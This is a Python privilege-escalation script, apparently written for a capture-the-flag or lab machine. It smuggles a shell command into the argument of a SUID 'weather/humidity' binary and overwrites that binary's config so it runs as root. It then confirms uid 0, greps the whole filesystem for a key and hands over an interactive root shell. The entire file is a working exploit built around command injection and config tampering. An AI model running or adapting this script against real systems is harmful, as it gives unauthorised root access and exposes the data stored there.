import subprocess
import time
import sys
import select

def interact(process):
    """
    Switches to interactive mode.
    This handles streaming the grep output and then giving you the shell prompt.
    """
    print("\n" + "="*50)
    print(" [+] ROOT SHELL ACTIVE")
    print(" [*] Streaming grep results... (This may take a moment)")
    print(" [*] When the search finishes, you will have control.")
    print("="*50 + "\n")

    while True:
        try:
            # Monitor both keyboard (stdin) and process output (stdout)
            reads = [sys.stdin.fileno(), process.stdout.fileno()]
            ret = select.select(reads, [], [])

            for fd in ret[0]:
                if fd == process.stdout.fileno():
                    # Read from shell -> Print to screen
                    output = process.stdout.read(1)
                    if not output:
                        print("\n[*] Shell closed.")
                        return
                    sys.stdout.write(output)
                    sys.stdout.flush()
                    
                if fd == sys.stdin.fileno():
                    # Read from keyboard -> Send to shell
                    command = sys.stdin.readline()
                    process.stdin.write(command)
                    process.stdin.flush()
                    
        except KeyboardInterrupt:
            print("\n[*] Interrupted. Closing shell.")
            return
        except Exception as e:
            print(f"\n[-] Connection lost: {e}")
            return

def main():
    # --- CONFIGURATION ---
    binary_path = "/usr/local/weather/humidity"
    key = "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6"
    
    # Payload: KEY'; python3 -c 'import os; os.system("/bin/bash")'; #
    initial_arg = f"{key}'; python3 -c 'import os; os.system(\"/bin/bash\")'; #"

    print("--- Starting Privilege Escalation Chain ---")
    print("[*] Step 1: Triggering SUID binary...")

    # Launch process
    process = subprocess.Popen(
        [binary_path, initial_arg],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=0 
    )

    # Commands to escalate to Root
    setup_commands = [
        # 1. Overwrite config to drop privileges to Root
        "echo \"username=root\" > /usr/local/weather/config",
        "echo \"groupname=root\" >> /usr/local/weather/config",
        
        # 2. Trigger SUID binary again to get Root Shell
        f'/usr/local/weather/humidity "{key}\'; python3 -c \'import os; os.system(\\"/bin/bash\\")\'; #"',
        
        # 3. Verify ID
        "id"
    ]

    try:
        # --- PHASE 1: GET ROOT ---
        for cmd in setup_commands:
            process.stdin.write(cmd + "\n")
            time.sleep(0.5)

        # Verify Root Access
        print("[*] Verifying Root access...")
        while True:
            # Check if data is available to read (non-blocking)
            if select.select([process.stdout], [], [], 1)[0]:
                line = process.stdout.readline()
                # print(f"  [Log]: {line.strip()}") # Uncomment to see verbose logs
                
                if "uid=0(root)" in line or "euid=0(root)" in line:
                    print(" [+] ROOT ACCESS CONFIRMED!")
                    break
            else:
                # If we timeout without seeing root, break loop and hope for best
                break

        # --- PHASE 2: GREP THE DRIVE ---
        search_term = "4b2f3c2d-1f88-4a09-8bd4-d3e5e52e19a6"
        
        # Grep Command Explanation:
        # -r : Recursive
        # -C 5 : Show 5 lines of Context (before and after)
        # 2>/dev/null : Hide "Permission denied" errors for cleaner output
        # --exclude-dir : Skip virtual filesystems to prevent hanging
        grep_cmd = f"grep -r -C 5 --exclude-dir={{proc,sys,dev,run}} '{search_term}' / 2>/dev/null"
        
        print(f"\n[*] Sending grep command for: {search_term}")
        process.stdin.write(grep_cmd + "\n")

        # --- PHASE 3: INTERACTIVE SHELL ---
        # The grep output will stream to your screen via this function
        interact(process)

    except Exception as e:
        print(f"[-] Error: {e}")
    finally:
        process.terminate()

if __name__ == "__main__":
    main()
